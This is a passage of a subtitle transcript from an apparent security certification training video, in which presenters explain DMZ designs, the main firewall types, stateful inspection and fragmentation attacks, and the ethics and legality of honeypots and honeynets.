00:21:43.020\n&gt;&gt; [LAUGH]\n&gt;&gt; [COUGH] If you get bored, right,\n\n439\n00:21:43.020 --> 00:21:44.770\nwe could come up with something else.\n\n440\n00:21:44.770 --> 00:21:48.570\nSo you'll see there we have\nthe two firewalls, right?\n\n441\n00:21:48.570 --> 00:21:51.810\nAnd what you're gonna look at when we\nthink about the DMZ is this is what people\n\n442\n00:21:51.810 --> 00:21:54.500\noften consider, right,\nwhen we say a traditional DMZ,\n\n443\n00:21:54.500 --> 00:21:56.210\nthis is what we think about.\n\n444\n00:21:56.210 --> 00:22:00.710\nBut a DMZ can also be built another way,\nand we could say, hypothetically,\n\n445\n00:22:00.710 --> 00:22:04.780\ncan you take out that, no, no,\nno, leave that one in place.\n\n446\n00:22:04.780 --> 00:22:07.020\nCan you take out the internal firewall?\n\n447\n00:22:07.020 --> 00:22:08.970\nOkay, just take that one out.\n\n448\n00:22:08.970 --> 00:22:12.180\nAnd there we just broke\nthe network communication.\n\n449\n00:22:12.180 --> 00:22:13.425\n&gt;&gt; We're gonna do multihomed?\n\n450\n00:22:13.425 --> 00:22:15.180\n&gt;&gt; No, no, just leave it where it was.\n\n451\n00:22:15.180 --> 00:22:17.370\nSo no elasticity on the web server.\n\n452\n00:22:17.370 --> 00:22:18.279\nI like how that bounced back right away.\n\n453\n00:22:18.279 --> 00:22:19.316\n&gt;&gt; Yeah, I like that.\n&gt;&gt; Can you do that one more time?\n\n454\n00:22:19.316 --> 00:22:19.952\nThat was so cool.\n\n455\n00:22:19.952 --> 00:22:20.500\n&gt;&gt; All right.\n\n456\n00:22:20.500 --> 00:22:22.550\n&gt;&gt; And then just bounce it back?\n\n457\n00:22:22.550 --> 00:22:23.475\nWow, that is awesome.\n\n458\n00:22:23.475 --> 00:22:24.700\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so\n\n459\n00:22:24.700 --> 00:22:26.710\nif we could just bridge that back up,\nCraig.\n\n460\n00:22:26.710 --> 00:22:27.322\nCool.\n&gt;&gt; All right, fix the gap, yeah.\n\n461\n00:22:27.322 --> 00:22:28.181\n&gt;&gt; All right, fix the gap.\n\n462\n00:22:28.181 --> 00:22:31.430\nSo mind the gap, as they say overseas.\n\n463\n00:22:31.430 --> 00:22:33.400\nI actually have one of those shirts.\n\n464\n00:22:33.400 --> 00:22:35.990\nWhen I was in London,\nI forget when I was there.\n\n465\n00:22:35.990 --> 00:22:38.510\nIt was earlier this year I was\nover there doing a gig, and\n\n466\n00:22:38.510 --> 00:22:43.150\nmy wife actually came over with me so\nwe were there with a bunch of friends.\n\n467\n00:22:43.150 --> 00:22:44.050\nAnd she went out for\n\n468\n00:22:44.050 --> 00:22:48.350\nthe day with one of the people I\nwork with through ISC Squared.\n\n469\n00:22:48.350 --> 00:22:50.010\nAnd they went out and\nthey went sightseeing.\n\n470\n00:22:50.010 --> 00:22:51.610\nSo her big thing, her cousin lives there.\n\n471\n00:22:51.610 --> 00:22:53.860\nAnd so yeah, they went out and\nmet everybody, went shopping,\n\n472\n00:22:53.860 --> 00:22:55.840\nshe went to Harrods and\nshe got presents for everybody.\n\n473\n00:22:55.840 --> 00:22:57.394\nAnd she bought us all\nmind the gap t-shirts.\n\n474\n00:22:57.394 --> 00:22:58.156\n&gt;&gt; Nice.\n&gt;&gt; Because that's\n\n475\n00:22:58.156 --> 00:22:58.880\na big thing for the Tube.\n\n476\n00:22:58.880 --> 00:23:00.860\nEverybody says you gotta mind\nthe gap when you get on the Tube.\n\n477\n00:23:00.860 --> 00:23:02.610\nSo she brought everybody\nmind the gap t-shirts.\n\n478\n00:23:02.610 --> 00:23:03.605\nSo I have my mind the gap tee.\n\n479\n00:23:03.605 --> 00:23:04.220\n&gt;&gt; [LAUGH]\n&gt;&gt; With the big,\n\n480\n00:23:04.220 --> 00:23:05.605\nyou know the big lettered\nunderground logo.\n\n481\n00:23:05.605 --> 00:23:06.170\n&gt;&gt; Uh-huh.\n\n482\n00:23:06.170 --> 00:23:07.420\n&gt;&gt; Mind the gap on it.\n\n483\n00:23:07.420 --> 00:23:08.835\nYeah, so it's kind of cool.\n\n484\n00:23:08.835 --> 00:23:10.058\n&gt;&gt; [LAUGH]\n&gt;&gt; But you are not minding the gap\n\n485\n00:23:10.058 --> 00:23:11.080\nbecause you let it exist.\n\n486\n00:23:11.080 --> 00:23:12.100\n&gt;&gt; I was not I let the gap live.\n\n487\n00:23:12.100 --> 00:23:13.745\n&gt;&gt; But you fixed it, so that's okay.\n\n488\n00:23:13.745 --> 00:23:17.269\nSo what we have there is we have\nanother way of thinking about creating\n\n489\n00:23:17.269 --> 00:23:20.852\na protection profile here with the DMZ,\nbut not the traditional DMZ,\n\n490\n00:23:20.852 --> 00:23:23.305\nwe just have a simple single firewall,\nright?\n\n491\n00:23:23.305 --> 00:23:23.855\n&gt;&gt; Mm-hm.\n\n492\n00:23:23.855 --> 00:23:28.160\n&gt;&gt; Now this is a point of contention among\nsome security professionals because now,\n\n493\n00:23:28.160 --> 00:23:31.300\nwhether that is, let's say, a Windows\nmachine or a Linux machine acting as\n\n494\n00:23:31.300 --> 00:23:34.690\na firewall, whether it's a firewall\ndevice doesn't really matter.\n\n495\n00:23:34.690 --> 00:23:36.190\nThat becomes the single point of failure.\n\n496\n00:23:36.190 --> 00:23:38.480\n&gt;&gt; Right.\n&gt;&gt; If that firewall device were to fail,\n\n497\n00:23:38.480 --> 00:23:39.540\nwe're totally unprotected.\n\n498\n00:23:39.540 --> 00:23:40.680\n&gt;&gt; Or compromised.\n\n499\n00:23:40.680 --> 00:23:43.850\n&gt;&gt; Or compromised anyway, but\nif we multihome it as you were suggesting,\n\n500\n00:23:43.850 --> 00:23:47.100\nwe are now creating the DMZ\nthrough a single firewall.\n\n501\n00:23:47.100 --> 00:23:50.580\nSingle device we didn't do that just to\nmake the point before Mike was starting to\n\n502\n00:23:50.580 --> 00:23:53.770\ndraw lines all over the place that we\nwould have a single point of failure.\n\n503\n00:23:53.770 --> 00:23:56.010\nNow we can still create the DMZ there, but\n\n504\n00:23:56.010 --> 00:23:58.577\nit will be logical as\nopposed to a physical DMZ.\n\n505\n00:23:58.577 --> 00:24:01.980\nAnd there's nothing wrong with that\nexcept for the fact, as we said,\n\n506\n00:24:01.980 --> 00:24:05.901\nthat we could potentially Wind up with an\nissue here where we may make it easier for\n\n507\n00:24:05.901 --> 00:24:07.401\nthe attacker to gain access and\n\n508\n00:24:07.401 --> 00:24:11.000\nto violate the protection space\nbecause they could take down the box.\n\n509\n00:24:11.000 --> 00:24:12.070\n&gt;&gt; That would be my theory.\n\n510\n00:24:12.070 --> 00:24:16.100\nIf he was on that firewall and\nhe was in the DMZ, he or\n\n511\n00:24:16.100 --> 00:24:21.230\nshe is not very far from that port\nthat goes into the enterprise network.\n\n512\n00:24:21.230 --> 00:24:22.260\nThere's one port over right?\n\n513\n00:24:22.260 --> 00:24:23.824\nI mean you know what I mean logically.\n\n514\n00:24:23.824 --> 00:24:26.018\n&gt;&gt; Absolutely,\nthey've got control of the device.\n\n515\n00:24:26.018 --> 00:24:27.330\nThey have control of all that.\n\n516\n00:24:27.330 --> 00:24:28.950\nNumber one but let's assume for\n\n517\n00:24:28.950 --> 00:24:31.320\na minute that they're able to\ntake down the firewall, right?\n\n518\n00:24:31.320 --> 00:24:33.660\nEven go another level.\n\n519\n00:24:33.660 --> 00:24:36.698\nYou may not be able to get in\nbecause routing is coming in and\n\n520\n00:24:36.698 --> 00:24:40.544\nout of that firewall those external\nconnections are what you essentially\n\n521\n00:24:40.544 --> 00:24:42.417\nhave as your external IPs, right?\n\n522\n00:24:42.417 --> 00:24:45.609\nThat you're connecting with depending\non how you set routing up and\n\n523\n00:24:45.609 --> 00:24:47.640\nif that is indeed the access point.\n\n524\n00:24:47.640 --> 00:24:50.250\nSo there may be a gap,\nthey may not be able to get in, but\n\n525\n00:24:50.250 --> 00:24:52.290\nthe problem is you've exposed everything.\n\n526\n00:24:52.290 --> 00:24:54.510\nAnd if there is another way in or\n\n527\n00:24:54.510 --> 00:24:57.330\nthey are able to reestablish connectivity\nby bringing the firewall up and\n\n528\n00:24:57.330 --> 00:25:01.250\ncontrol it, now all of the sudden\nthey control all traffic in and out.\n\n529\n00:25:01.250 --> 00:25:04.672\nYes, so this can be a bit of a challenge,\nbut it is a legitimate architecture.\n\n530\n00:25:04.672 --> 00:25:07.876\nWhich you often see DMZs\ncreated with a bastion host or\n\n531\n00:25:07.876 --> 00:25:12.380\na single device of some kind that is\ngonna take the place of two firewalls.\n\n532\n00:25:12.380 --> 00:25:14.890\nSo that's just something else\nto point out and think about,\n\n533\n00:25:14.890 --> 00:25:18.990\njust something to kind of be aware of\nright as we talk about firewalls and\n\n534\n00:25:18.990 --> 00:25:20.720\nDMZs just thinking about that.\n\n535\n00:25:20.720 --> 00:25:22.490\nSo different types of firewalls, right?\n\n536\n00:25:22.490 --> 00:25:25.420\nWe do have a rather different types\nof DMZ architecture I should say.\n\n537\n00:25:25.420 --> 00:25:27.870\nWe do have different types of firewalls\nas well that we wanna think about.\n\n538\n00:25:27.870 --> 00:25:30.840\nYou know a firewall is not\njust a firewall, right?\n\n539\n00:25:30.840 --> 00:25:33.560\nIt could be a device, a hardware device.\n\n540\n00:25:33.560 --> 00:25:36.390\nIt could be a software based\nimplementation of a firewall,\n\n541\n00:25:36.390 --> 00:25:37.960\na piece of software that's running.\n\n542\n00:25:37.960 --> 00:25:39.550\nSo we've different ways of\nthinking about this but\n\n543\n00:25:39.550 --> 00:25:41.230\nwe also have different functionality.\n\n544\n00:25:41.230 --> 00:25:44.620\nWe have packet filtering firewalls,\ncircuit level gateways firewalls,\n\n545\n00:25:44.620 --> 00:25:49.050\napplication level gateway firewalls,\nstateful multilayer inspection firewalls.\n\n546\n00:25:49.050 --> 00:25:52.520\nSo we have different ways of thinking\nabout the different kinds of firewalls\n\n547\n00:25:52.520 --> 00:25:53.530\nthat we may use.\n\n548\n00:25:53.530 --> 00:25:56.050\nSo talk about packet filtering\nfirewalls for a minute.\n\n549\n00:25:56.050 --> 00:25:59.870\nPacket filtering firewalls are gonna work\nat the network layer of the OSI model so\n\n550\n00:25:59.870 --> 00:26:02.490\nthey're down deep,\ndown towards the bottom of the stack.\n\n551\n00:26:02.490 --> 00:26:07.034\nThey're dealing with traffic obviously at\nthe very very basic levels of the bits and\n\n552\n00:26:07.034 --> 00:26:10.951\nbytes with regards to network traffic and\nunderstanding IP addresses.\n\n553\n00:26:10.951 --> 00:26:15.309\nThey're looking at the IP addresses at\nlayer three and as a result of that\n\n554\n00:26:15.309 --> 00:26:19.954\nthey are usually found, usually routers\nhave this capability even though we\n\n555\n00:26:19.954 --> 00:26:24.410\nsay it's a firewall, typically\na router performs this capability.\n\n556\n00:26:24.410 --> 00:26:26.950\nSo it's an all in one\nkinda thought process.\n\n557\n00:26:26.950 --> 00:26:29.870\nEach packet is compared to a set of\ncriteria before we move them through and\n\n558\n00:26:29.870 --> 00:26:30.630\nforward them.\n\n559\n00:26:30.630 --> 00:26:34.630\nSo we're doing this on a packet by packet\nbasis, you wanna think about that.\n\n560\n00:26:34.630 --> 00:26:36.160\nAnd obviously, depending on the criteria,\n\n561\n00:26:36.160 --> 00:26:38.810\nwe can drop or\nallow the packet back and forth.\n\n562\n00:26:38.810 --> 00:26:40.930\nAnd we have rules that focus on source and\n\n563\n00:26:40.930 --> 00:26:45.110\ndestination IP, port number protocol,\nthings like that.\n\n564\n00:26:45.110 --> 00:26:49.233\nWhat we would understand and know at\nthat layer or layers of the OSI model.\n\n565\n00:26:49.233 --> 00:26:51.166\nMAC addresses in theory\ncan be used as well,\n\n566\n00:26:51.166 --> 00:26:54.822\nbecause they're below with the data link\nlayer, although we don't tend to do a lot\n\n567\n00:26:54.822 --> 00:26:58.165\nof filtering just based on Mac addresses\nat routers, cuz it's gonna be very\n\n568\n00:26:58.165 --> 00:27:01.120\ndifficult to really maintain that list and\nkeep up to date with it.\n\n569\n00:27:01.120 --> 00:27:03.170\nIP addresses and\n[INAUDIBLE] are a lot easier, right.\n\n570\n00:27:03.170 --> 00:27:04.506\nBut we are gonna see that and\n\n571\n00:27:04.506 --> 00:27:07.366\nwe can use packet filtering\nfirewalls very effectively.\n\n572\n00:27:07.366 --> 00:27:11.186\nYour home ISP sponsored,\nall in one, gateway device,\n\n573\n00:27:11.186 --> 00:27:15.510\nyour little cable modem device\nis gonna have this capability.\n\n574\n00:27:15.510 --> 00:27:16.360\nIt's got a firewall and\n\n575\n00:27:16.360 --> 00:27:20.590\na router and IDS and capability probably\nall in one built in these days.\n\n576\n00:27:20.590 --> 00:27:22.660\nAnd it's doing some just very\nbasic packet filtering, and\n\n577\n00:27:22.660 --> 00:27:24.540\nthat's the kinda stuff that goes on.\n\n578\n00:27:24.540 --> 00:27:26.240\nSo, it's very simple to implement.\n\n579\n00:27:26.240 --> 00:27:29.160\nWith circuit level gateway firewalls,\nwe're working at the session layer\n\n580\n00:27:29.160 --> 00:27:31.430\nof the OSI model, so\nwe're stepping up a little bit.\n\n581\n00:27:31.430 --> 00:27:35.690\nWe're gonna be at layer four, so as a\nresult, or we're going to be dealing with\n\n582\n00:27:35.690 --> 00:27:40.830\nsession related information and/or\nthe TCP layer of the protocol stack.\n\n583\n00:27:40.830 --> 00:27:44.800\nSo we can be thinking about having\nunderstanding of that protocol layer above\n\n584\n00:27:44.800 --> 00:27:45.400\nIP, right?\n\n585\n00:27:45.400 --> 00:27:51.330\nSo as a result, when we are thinking about\nthis knowledge and have this ability.\n\n586\n00:27:51.330 --> 00:27:53.141\nShould I hold it here?\nBecause you keep up going up and\n\n587\n00:27:53.141 --> 00:27:55.710\nyour like scratching off\nthe side while I'm sitting here.\n\n588\n00:27:55.710 --> 00:27:57.341\nI don't know if that\nmeant I should go up or\n\n589\n00:27:57.341 --> 00:27:58.938\nif I was at the right layer for OSI model.\n\n590\n00:27:58.938 --> 00:28:00.373\n&gt;&gt; No, you were just right.\n&gt;&gt; Was I below?\n\n591\n00:28:00.373 --> 00:28:03.445\nIt almost felt like I was layer\nbelow where I needed to be so\n\n592\n00:28:03.445 --> 00:28:06.950\nyou were signalling,\ngo up one layer as I was talking.\n\n593\n00:28:06.950 --> 00:28:09.480\nNo, higher, higher, you're on layer three,\nyou should be layer four.\n\n594\n00:28:09.480 --> 00:28:10.710\nWe said layer four would be up here.\n\n595\n00:28:10.710 --> 00:28:11.620\nLayer three was down here.\n\n596\n00:28:11.620 --> 00:28:14.840\nSo you just have to think about the fact\nthat now we've got some additional\n\n597\n00:28:14.840 --> 00:28:17.160\nknowledge capabilities\nexposure of information.\n\n598\n00:28:17.160 --> 00:28:20.330\nSo we're gonna be able to obviously\nleverage that and we're gonna be able to\n\n599\n00:28:20.330 --> 00:28:24.610\nlook at more information and obviously\nhave more knowledge as a result of that.\n\n600\n00:28:24.610 --> 00:28:26.180\nSo keep this in mind.\n\n601\n00:28:26.180 --> 00:28:29.446\nWe're gonna be thinking through the logic\nthat if we pass this traffic back and\n\n602\n00:28:29.446 --> 00:28:31.129\nforth through a circuit level gateway,\n\n603\n00:28:31.129 --> 00:28:33.570\neverything appears to have\noriginated from the gateway.\n\n604\n00:28:33.570 --> 00:28:36.670\nSo one of the things we get with\nthis is we get that natting or\n\n605\n00:28:36.670 --> 00:28:40.530\nproxying effect, where we don't\nsee the internal information but\n\n606\n00:28:40.530 --> 00:28:44.230\nrather now we're only seeing the external\nIP that we're using for the gateway.\n\n607\n00:28:44.230 --> 00:28:46.728\nSo as a result we're stealthing\nthe internal network and\n\n608\n00:28:46.728 --> 00:28:49.183\nwe monitor these requests and\nmove them back and forth.\n\n609\n00:28:49.183 --> 00:28:52.823\nBut we're looking at basically the\ninternal IP or internal MAC address being\n\n610\n00:28:52.823 --> 00:28:56.700\nstealthed because now we're gonna show\nthat as being the outside on the gateway.\n\n611\n00:28:56.700 --> 00:28:58.580\nSo that's a capability there.\n\n612\n00:28:58.580 --> 00:29:01.530\nApplication level firewalls\nsometimes called WAF firewalls,\n\n613\n00:29:01.530 --> 00:29:02.930\nweb application firewalls.\n\n614\n00:29:02.930 --> 00:29:04.190\nWe hear that term a lot.\n\n615\n00:29:04.190 --> 00:29:06.010\nIf that's something you're hearing.\n\n616\n00:29:06.010 --> 00:29:09.380\nIt's also fun to say,\nsay it three times fast, WAF, WAF, WAF.\n\n617\n00:29:09.380 --> 00:29:10.560\nIt's almost like laughing, right?\n\n618\n00:29:10.560 --> 00:29:12.990\nYou're laughing, I'm using a WAF.\n\n619\n00:29:12.990 --> 00:29:16.100\nSo application-level gateways\nare commonly also referred to as proxies,\n\n620\n00:29:16.100 --> 00:29:16.990\nby the way, right?\n\n621\n00:29:16.990 --> 00:29:19.350\nSo we often hear them\nreferred to as proxies.\n\n622\n00:29:19.350 --> 00:29:22.441\nThey can filter packets at the application\nlayer of the OSI model, so\n\n623\n00:29:22.441 --> 00:29:24.424\nthey have complete knowledge of the stack.\n\n624\n00:29:24.424 --> 00:29:30.230\nObviously, as a result, up and down,\nside to side, across the stack as we go.\n\n625\n00:29:31.540 --> 00:29:34.844\nSo as we think about all that what\nwe're thinking about is the fact that\n\n626\n00:29:34.844 --> 00:29:37.822\nwe have complete knowledge of\nthe transmission at all levels.\n\n627\n00:29:37.822 --> 00:29:40.815\nSo we can understand not just IP,\nnot just MAC address,\n\n628\n00:29:40.815 --> 00:29:45.480\nnot just lower level functionality, but\nwe can understand upper level information.\n\n629\n00:29:45.480 --> 00:29:49.120\nSo the protocol, the application,\nwe can apply a lot more\n\n630\n00:29:49.120 --> 00:29:53.370\nintelligence to this filtering which makes\nit a lot stronger for us, a lot better for\n\n631\n00:29:53.370 --> 00:29:54.300\nus, to think about.\n\n632\n00:29:54.300 --> 00:29:57.354\nWe can be protocol specific and\nzero in on certain applications and\n\n633\n00:29:57.354 --> 00:29:58.453\ntheir functionality.\n\n634\n00:29:58.453 --> 00:30:03.018\nBecause now we can create firewalls and\nfiltrating that as unique to that set so\n\n635\n00:30:03.018 --> 00:30:07.740\nwe can have a WinSock Proxy or Socks proxy\nor Socks firewall or WinSock firewall.\n\n636\n00:30:07.740 --> 00:30:13.000\nWe can have an HTTP or FTP,\n\n637\n00:30:13.000 --> 00:30:18.240\ngopher, telnet whatever,\nwe can have specific firewalls and\n\n638\n00:30:18.240 --> 00:30:20.860\nspecific configurations to\ndeal with this protocols.\n\n639\n00:30:20.860 --> 00:30:24.500\nSo this is gonna be an value add if you\nwill when we think about application level\n\n640\n00:30:24.500 --> 00:30:25.169\nfirewalls.\n\n641\n00:30:26.250 --> 00:30:27.910\nSo a lot of capability there.\n\n642\n00:30:27.910 --> 00:30:32.150\nStateful multilayer inspection firewalls\nwhen we call stateful versus stateless.\n\n643\n00:30:32.150 --> 00:30:35.870\nA stateful firewall is gonna look at\npackets and understand the state and\n\n644\n00:30:35.870 --> 00:30:39.820\nthe session connectivity that the possess\nand see them holistically and\n\n645\n00:30:39.820 --> 00:30:41.780\nexamine them in relation\nto everything around them.\n\n646\n00:30:41.780 --> 00:30:44.990\nAs opposed to stateless filter and\nkind of gen1 firewalls\n\n647\n00:30:44.990 --> 00:30:47.960\nwhich just did individual packets\nhad no knowledge of state.\n\n648\n00:30:47.960 --> 00:30:51.230\nAnd as a result of that, you would see\nfragmentation attacks being very easily\n\n649\n00:30:51.230 --> 00:30:55.322\npropagated through these firewalls\nbecause we had no idea that packets 5, 7,\n\n650\n00:30:55.322 --> 00:30:58.065\nand 9 were part of\nthe initial transmission.\n\n651\n00:30:58.065 --> 00:31:00.405\nWe didn't link them to\nthe initial packets and so\n\n652\n00:31:00.405 --> 00:31:03.915\nwe didn't see the context and the\nconnection about the good or bad action.\n\n653\n00:31:03.915 --> 00:31:06.995\nBut when we started to realize that\nfragmentation text was becoming very\n\n654\n00:31:06.995 --> 00:31:09.367\npopular and that this was the cause.\n\n655\n00:31:09.367 --> 00:31:12.817\nAnd we started to inspect the entire\nsession and look at multiple pockets,\n\n656\n00:31:12.817 --> 00:31:15.707\nas part of that, fragmentation\nattacks have become a lot tougher.\n\n657\n00:31:15.707 --> 00:31:19.767\nNow we still have ways to go through and\nexecute them and so this is the stuff that\n\n658\n00:31:19.767 --> 00:31:22.780\nwe'll talk more about because there\nare time out values associated with these\n\n659\n00:31:22.780 --> 00:31:26.050\ninspection parameters that people don't\noften think about and know about.\n\n660\n00:31:26.050 --> 00:31:30.230\nAnd as a result of that, if we are smart\nand we can manipulate the way that this is\n\n661\n00:31:30.230 --> 00:31:36.020\nworking or understand it's\na hacker the way this is working.\n\n662\n00:31:36.020 --> 00:31:40.240\nThen what we can do and what we're smart\nenough to do if we're paying attention\n\n663\n00:31:40.240 --> 00:31:44.310\nis we'll send an initial innocuous very,\nvery basic packet through.\n\n664\n00:31:44.310 --> 00:31:45.920\nThe firewalls kinda look at that.\n\n665\n00:31:45.920 --> 00:31:46.663\nIt's gonna start monitoring.\n\n666\n00:31:46.663 --> 00:31:48.410\nWe're not gonna see so much else.\n\n667\n00:31:48.410 --> 00:31:50.120\nAnd we're gonna send\na few more packets along.\n\n668\n00:31:50.120 --> 00:31:52.740\nIt's gonna say, okay,\nyeah whatever I'm done monitoring and\n\n669\n00:31:52.740 --> 00:31:55.180\nif session monitoring is not\nimplemented the right way,\n\n670\n00:31:55.180 --> 00:31:57.960\nthat time out value can be\nessentially manipulated.\n\n671\n00:31:57.960 --> 00:32:01.309\nAnd because of that we can then send the\nattack packets in behind it after we stop\n\n672\n00:32:01.309 --> 00:32:03.460\nmonitoring and\nthen we can propagate the attack.\n\n673\n00:32:03.460 --> 00:32:06.963\nSo, this is something that can happen with\nthese firewalls if we're not careful.\n\n674\n00:32:06.963 --> 00:32:10.113\nSo we have to understand this and we'll\ntalk more about this and we'll See how\n\n675\n00:32:10.113 --> 00:32:13.408\nthat works and we'll talk a little bit\nmore in some up coming conversations about\n\n676\n00:32:13.408 --> 00:32:16.790\nthat, but we have different firewall\ntypes and we wanna understand that.\n\n677\n00:32:16.790 --> 00:32:19.890\nWe also generically have this idea\nof honey pots and honey nets.\n\n678\n00:32:19.890 --> 00:32:23.250\nThe other part of the general\ntopical frame of reference for\n\n679\n00:32:23.250 --> 00:32:26.510\nthis set of episodes that\nwe're putting together here.\n\n680\n00:32:26.510 --> 00:32:28.170\nAnd honey posts are interesting.\n\n681\n00:32:28.170 --> 00:32:32.820\nThe history of them Is a colorful\nto say the least because\n\n682\n00:32:32.820 --> 00:32:35.740\nearly on as people start to\nthink this was a good idea.\n\n683\n00:32:35.740 --> 00:32:40.020\nLet's actually first just start by\nsuggesting a definition of a honeypot.\n\n684\n00:32:40.020 --> 00:32:44.620\nWhich is a single machine honey knows\na group of machines configured together to\n\n685\n00:32:44.620 --> 00:32:47.680\nform a network,\nthat are purposely set up for\n\n686\n00:32:47.680 --> 00:32:52.140\nyou to use them as data send right your\ngonna dangle them in front of hackers.\n\n687\n00:32:52.140 --> 00:32:55.530\nHopefully if they are going\nto be configured well enough,\n\n688\n00:32:55.530 --> 00:32:57.010\ngood enough that they are attractive, but\n\n689\n00:32:57.010 --> 00:32:59.660\nnot so good that they're locked down to\nthe point that nobody gonna get to them.\n\n690\n00:32:59.660 --> 00:33:02.480\nSo you've gotta make them\nrealistic is my point.\n\n691\n00:33:02.480 --> 00:33:04.390\nThey should be patched,\nbut not fully, right?\n\n692\n00:33:04.390 --> 00:33:07.640\nThey should have some exploits available\ndepending on the kind of research\n\n693\n00:33:07.640 --> 00:33:10.200\nyou're looking to do, and\nthe kind of exploits you wanna understand\n\n694\n00:33:10.200 --> 00:33:13.010\ncan be used against you, but\nyou have to make them seem realistic.\n\n695\n00:33:13.010 --> 00:33:15.940\nSo they can't be so obvious that\nhackers look at them and go, yeah,\n\n696\n00:33:15.940 --> 00:33:19.230\nthere's no way you're running sp with\nno firewall, and no service pack.\n\n697\n00:33:19.230 --> 00:33:21.540\nSo that's probably not\nsomething I wanna play with.\n\n698\n00:33:21.540 --> 00:33:25.180\nBut, if you can trick the hacker\ninto taking this machine on and\n\n699\n00:33:25.180 --> 00:33:28.860\nthinking it is legitimate, then you'll\nget them to attack this machine.\n\n700\n00:33:28.860 --> 00:33:30.980\nYou're running it in a memory\nisolated environment.\n\n701\n00:33:30.980 --> 00:33:32.510\nWe normally virtualize these today.\n\n702\n00:33:32.510 --> 00:33:37.030\nSo we are creating a crucible and\nessentially allowing ourselves to\n\n703\n00:33:37.030 --> 00:33:40.730\nexamine what is happening in these\nenvironments to gain knowledge, and\n\n704\n00:33:40.730 --> 00:33:42.780\nto understand what the hackers\nare looking to do.\n\n705\n00:33:42.780 --> 00:33:45.460\nWe can hopefully take that knowledge,\nif we're smart, and\n\n706\n00:33:45.460 --> 00:33:47.350\napply it to make our defenses better.\n\n707\n00:33:47.350 --> 00:33:50.890\nTo safeguard our system so that when the\nreal attacks come, we're better protected,\n\n708\n00:33:50.890 --> 00:33:52.070\nbetter defended.\n\n709\n00:33:52.070 --> 00:33:55.800\nSo honey pots are very interesting and\nfor a long time, people were saying hey,\n\n710\n00:33:55.800 --> 00:33:57.920\nwe should defend or\nrather we should deploy these things or\n\n711\n00:33:57.920 --> 00:33:59.470\nuse them to help us defend.\n\n712\n00:33:59.470 --> 00:34:03.560\nBut they were always kind of looked at as\na little bit askew with something that may\n\n713\n00:34:03.560 --> 00:34:04.460\nnot be quite right.\n\n714\n00:34:04.460 --> 00:34:06.020\nMaybe not quite ethical.\n\n715\n00:34:06.020 --> 00:34:09.480\nMaybe not quite legal, and\nthere were some significant discussions.\n\n716\n00:34:09.480 --> 00:34:12.470\nAnd there's still murmurings around them\nand I think they've died down, because\n\n717\n00:34:12.470 --> 00:34:16.410\nthey're becoming very popular again and\npeople are using them more and more.\n\n718\n00:34:16.410 --> 00:34:19.870\nBut it's something to consider, because\nfor a long time people thought that there\n\n719\n00:34:19.870 --> 00:34:23.190\nwas not only an ethical dilemma with using\nhoney pots, but there was a legal dilemma.\n\n720\n00:34:23.190 --> 00:34:26.270\nBecause it was not clear whether\nthis was enticement or entrapment.\n\n721\n00:34:26.270 --> 00:34:31.500\nAnd so as a result we had some problems\npotentially with using this kind of device\n\n722\n00:34:31.500 --> 00:34:33.770\nbecause we weren't sure if\nthis was breaking the law.\n\n723\n00:34:33.770 --> 00:34:35.110\nYou were allowed to entice people,\n\n724\n00:34:35.110 --> 00:34:38.430\nwe're not allowed to entrap them into\nessentially doing illegal things or\n\n725\n00:34:38.430 --> 00:34:41.590\ncarrying out illegal activities,\nwhen normally they would not.\n\n726\n00:34:41.590 --> 00:34:43.120\nTricking them in other words, right?\n\n727\n00:34:43.120 --> 00:34:47.270\nInto carrying out illegal activities is\nnot allowed, giving them the opportunity,\n\n728\n00:34:47.270 --> 00:34:49.150\nright to knock on the door and\nopen it themselves.\n\n729\n00:34:49.150 --> 00:34:51.180\nYes, that's enticement, and so\n\n730\n00:34:51.180 --> 00:34:55.250\nwe wanna understand that this\nwas a bit of a challenge.\n\n731\n00:34:55.250 --> 00:34:58.940\nPeople are not real clear in how to use in\nthe place and they fell out of favor for\n\n732\n00:34:58.940 --> 00:35:01.740\na long time,\nthey're coming back into favor as I said.\n\n733\n00:35:01.740 --> 00:35:05.730\nI think the advent of some clarity on the\nlegal side with some things that had gone\n\n734\n00:35:05.730 --> 00:35:09.220\non to further define, and really do market\nthat boundary between enticement, and\n\n735\n00:35:09.220 --> 00:35:13.130\nentrapment has helped I think\nthe cross streams of cloud.\n\n736\n00:35:13.130 --> 00:35:17.240\nAnd virtualization are coming together and\nthe ability to use virtualization\n\n737\n00:35:17.240 --> 00:35:21.170\ntechnology, not just to drive the cloud as\nwe've talked about in the cloud episodes.\n\n738\n00:35:21.170 --> 00:35:24.200\nI encourage you to watch that\ntopical set of conversations,\n\n739\n00:35:24.200 --> 00:35:26.180\nvery interesting stuff we go into there.\n\n740\n00:35:26.180 --> 00:35:30.440\nIn that addition to that, understanding\nthat, because of the great advent in\n\n741\n00:35:30.440 --> 00:35:34.250\nvirtualization today, and the fact\nthe almost everything we do In one form or\n\n742\n00:35:34.250 --> 00:35:35.760\nanother is going to touch\na virtual environment.\n\n743\n00:35:35.760 --> 00:35:37.930\nAnd we could spin these environments up so\nquickly.\n\n744\n00:35:37.930 --> 00:35:40.880\nYou know years ago you had to build\nthis stuff all by hand, and then you put\n\n745\n00:35:40.880 --> 00:35:44.130\nit out there and five minutes later it was\nbroken, because somebody hacked into it.\n\n746\n00:35:44.130 --> 00:35:45.690\nAnd it took all that time and\neffort and you may or\n\n747\n00:35:45.690 --> 00:35:47.445\nmay not get a lot A lot\nof value out of that.\n\n748\n00:35:47.445 --> 00:35:50.815\nToday with templating,\nwith cloning, with virtualization,\n\n749\n00:35:50.815 --> 00:35:54.495\nfive ten minutes you can respawn an entire\nnetwork with software definition, and\n\n750\n00:35:54.495 --> 00:35:57.285\nautomation, and containers and\nall the other stuff we do.\n\n751\n00:35:57.285 --> 00:36:00.867\nYou know it's not hard to\nbe able to do this today.\n\n752\n00:36:00.867 --> 00:36:02.557\nSo it's really become, I think, very,\n\n753\n00:36:02.557 --> 00:36:07.257\nvery basic as a general part of\nthe toolkit, things that people can do.\n\n754\n00:36:07.257 --> 00:36:09.227\nAnd it's a very, very functional and\n\n755\n00:36:09.227 --> 00:36:12.467\nimportant part of how we build border\nprotection and gateway protection.\n\n756\n00:36:12.467 --> 00:36:14.827\nSo honeypots are become very popular.\n\n757\n00:36:14.827 --> 00:36:18.967\nHoneynets are simply strings of honeypots\nbrought together in a essentially virtual\n\n758\n00:36:18.967 --> 00:36:22.820\nnetwork to be able to allow for\ndeep inspection, probing, and attacking.\n\n759\n00:36:22.820 --> 